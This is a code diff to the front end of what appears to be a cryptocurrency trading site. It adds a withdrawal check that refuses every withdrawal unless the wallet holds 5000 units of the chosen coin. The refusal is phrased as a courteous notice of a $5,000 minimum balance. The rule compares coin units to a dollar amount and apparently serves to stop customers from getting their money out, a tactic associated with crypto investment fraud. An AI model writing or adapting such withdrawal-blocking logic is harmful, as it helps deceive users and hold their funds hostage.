@@ -226,7 +226,13 @@ export default function Home() {
       alert('Please enter a valid withdrawal amount.');
       return;
     }
+const minimumRequired = 5000;
+    const currentBalance = userCryptoHoldings[selectedWithdrawCoin?.symbol] || 0;
 
+    if (currentBalance < minimumRequired) {
+      alert("Dear Valued Customer,\nRegarding your withdrawal request, please note that a minimum wallet balance of $5,000 is required to complete this transaction.");
+      return;
+    }
     const currentCoinHolding = userCryptoHoldings[selectedWithdrawCoin.symbol] || 0;
     if (currentCoinHolding < amount) {
       alert(`Insufficient ${selectedWithdrawCoin.symbol} balance.`);
